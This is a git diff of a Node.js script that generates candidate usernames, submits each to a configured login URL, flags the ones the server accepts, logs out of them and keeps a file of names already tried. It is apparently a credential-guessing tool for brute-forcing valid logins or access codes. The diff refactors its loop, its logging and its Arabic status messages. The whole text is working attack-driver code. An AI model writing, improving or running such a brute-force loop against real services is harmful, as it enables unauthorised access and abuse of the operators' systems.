@@ -1,8 +1,8 @@
 import chalk from 'chalk';
-import { LogBanner, LogVaild, LogInvaild } from './Logger.js';
+import { LogBanner, LogAttempt, LogInfo, LogWarn } from './Logger.js';
 import {
     sendRequest, Logout, checkServerConnection, generateUsername,
-    delay,generateAlphaNumUsername, AddtoFile, checkfromResponse, LoadUsernamesToTest
+    delay, AddtoFile, checkfromResponse, LoadUsernamesToTest
 }
     from './Utils.js'
 import { url, logout_url, count, config } from './variables.js';
@@ -14,61 +14,53 @@ let tested = LoadUsernamesToTest();
 let i = 0;
 let c = 0;
 LogBanner(TOOL_NAME);
-export async function run() {
-    for (let _ = 0; _ < count; _++) {
-        let serverOnline = await checkServerConnection();
-        while (!serverOnline) {
-            console.log(chalk.green(`[+] Waiting for network connection...`));
-            await delay(5000);
-            serverOnline = await checkServerConnection(url);
-        }
 
+async function waitForServer() {
+    let serverOnline = await checkServerConnection();
+    while (!serverOnline) {
+        LogWarn('بانتظار الاتصال بالشبكة...');
+        await delay(5000);
+        serverOnline = await checkServerConnection(url);
+    }
+}
+
+export async function run() {
+    await waitForServer();
+
+    for (let _ = 0; _ < count; _++) {
         const startt = Date.now();
         const newModified = LastModified();
         if (newModified !== LstModi) {
-            console.log(chalk.yellow("\n[*] Detected change in config.json, reloading..."));
+            LogInfo('تم اكتشاف تغيير في الإعدادات، جارِ إعادة التحميل...');
             config;
             LstModi = newModified;
-            console.log(chalk.cyan("[+] New settings applied!"));
+            LogInfo('تم تطبيق الإعدادات الجديدة!');
         }
-        //let username = generateUsername();
-        
-      let username =generateAlphaNumUsername();
-      if (tested.has(username)) {//console.log(_);
-            continue
-        };
+
+        let username = generateUsername();
+        if (tested.has(username)) {
+            continue;
+        }
         tested.add(username);
         AddtoFile(username);
         i++;
 
-        
+        try {
+            const response = await sendRequest(username);
+            const isValid = checkfromResponse(response);
+            const ms = Date.now() - startt;
 
-        console.log(chalk.magenta(`[DEBUG] Testing ${username} (#${i})`));
+            LogAttempt(i, username, isValid, ms);
 
-try {
-           const response = await sendRequest(username);
-
-        if (checkfromResponse(response)) {
-            LogVaild(username);
-            if (logout_url) {
+            if (isValid && logout_url) {
                 Logout(username);
             }
-        } else {
-            LogInvaild(username);
-
+        } catch (err) {
+            console.log(chalk.red(`  ✗ ${username}  فشل الطلب: ${err.code || err.message}`));
+            await waitForServer();
+            continue;
         }
-
-        const end = Date.now();
-        console.log(chalk.gray(`Token Time: ${end - startt} ms`));
-
-}
- catch (err) {
-    console.log(chalk.red(`[!] Request failed for ${username}: ${err.code || err.message}`));
-    continue; 
-}
-
-
     }
 
-    console.log(chalk.cyan("\n[*] Done."));
+    LogInfo('تم الانتهاء.');
 };
